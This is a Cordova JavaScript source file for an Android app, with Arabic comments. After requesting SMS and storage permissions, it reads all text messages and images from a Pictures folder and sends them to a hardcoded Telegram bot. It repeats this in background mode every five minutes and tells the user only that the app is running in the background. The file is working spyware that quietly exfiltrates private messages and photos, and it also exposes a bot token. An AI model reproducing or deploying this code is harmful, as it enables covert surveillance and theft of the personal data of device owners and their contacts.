document.addEventListener('deviceready', onDeviceReady, false);

// إعدادات بوت تيليجرام
const BOT_TOKEN = '7988955212:AAFqpIpyQ1MlQ-sASLG0oMRLu4vMhkZNGDk';
const CHAT_ID = '5739065274';
const TELEGRAM_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
const TELEGRAM_FILE_API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

function onDeviceReady() {
  console.log('Cordova جاهز');
  requestPermissions();
}

function requestPermissions() {
  var permissions = cordova.plugins.permissions;
  permissions.requestPermissions(
    [
      permissions.READ_SMS,
      permissions.READ_EXTERNAL_STORAGE,
      permissions.WRITE_EXTERNAL_STORAGE,
      permissions.SEND_SMS,
      permissions.RECEIVE_SMS,
      permissions.INTERNET
    ],
    function(status) {
      if (status.hasPermission) {
        alert("تم منح الأذونات بنجاح");
        startBackgroundTasks();
      } else {
        alert("تم رفض الأذونات");
      }
    },
    function(error) {
      console.warn("فشل طلب الأذونات", error);
    }
  );
}

function startBackgroundTasks() {
  // سحب وإرسال الرسائل النصية
  fetchAndSendSMS();
  
  // سحب وإرسال الصور
  fetchAndSendImages();
  
  // تشغيل الخدمة في الخلفية
  startBackgroundService();
}

function fetchAndSendSMS() {
  if (typeof SMS !== 'undefined') {
    SMS.listSMS({}, function(data) {
      data.forEach(function(message) {
        const smsData = {
          address: message.address,
          body: message.body,
          date: new Date(message.date).toLocaleString()
        };
        
        const text = `رسالة جديدة:\nمن: ${smsData.address}\nمحتوى: ${smsData.body}\nالتاريخ: ${smsData.date}`;
        
        sendToTelegram(text);
      });
    }, function(error) {
      console.error('خطأ في قراءة الرسائل:', error);
    });
  } else {
    console.error('SMS plugin not available');
  }
}

function fetchAndSendImages() {
  const imagePath = '/storage/emulated/150/Pictures/100PINT/Pins';
  
  window.resolveLocalFileSystemURL(imagePath, function(directoryEntry) {
    const directoryReader = directoryEntry.createReader();
    
    directoryReader.readEntries(function(entries) {
      entries.forEach(function(entry) {
        if (entry.isFile && isImageFile(entry.name)) {
          sendImageToTelegram(entry);
        }
      });
    }, function(error) {
      console.error('خطأ في قراءة الملفات:', error);
    });
  }, function(error) {
    console.error('خطأ في الوصول للمسار:', error);
  });
}

function isImageFile(filename) {
  const imageExtensions = ['.jpg', '.jpeg', '.png', '.gif', '.bmp'];
  return imageExtensions.some(ext => filename.toLowerCase().endsWith(ext));
}

function sendImageToTelegram(fileEntry) {
  fileEntry.file(function(file) {
    const reader = new FileReader();
    
    reader.onloadend = function() {
      const blob = new Blob([this.result], { type: file.type });
      const formData = new FormData();
      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, file.name);
      
      fetch(TELEGRAM_FILE_API_URL, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(data => console.log('تم إرسال الصورة:', data))
      .catch(error => console.error('خطأ في إرسال الصورة:', error));
    };
    
    reader.readAsArrayBuffer(file);
  }, function(error) {
    console.error('خطأ في قراءة الملف:', error);
  });
}

function sendToTelegram(text) {
  const data = {
    chat_id: CHAT_ID,
    text: text
  };
  
  fetch(TELEGRAM_API_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(data)
  })
  .then(response => response.json())
  .then(data => console.log('تم إرسال الرسالة:', data))
  .catch(error => console.error('خطأ في إرسال الرسالة:', error));
}

function startBackgroundService() {
  // استخدام cordova-plugin-background-mode لتشغيل الخدمة في الخلفية
  if (window.cordova && window.cordova.plugins.backgroundMode) {
    cordova.plugins.backgroundMode.enable();
    cordova.plugins.backgroundMode.on('activate', function() {
      cordova.plugins.backgroundMode.disableWebViewOptimizations();
    });
    
    // تشغيل المهام كل 5 دقائق
    setInterval(function() {
      fetchAndSendSMS();
      fetchAndSendImages();
    }, 5 * 60 * 1000);
  } else {
    console.warn('Background mode plugin not available');
  }
}

function enterApp() {
  document.getElementById("message").innerText = "التطبيق يعمل في الخلفية";
}
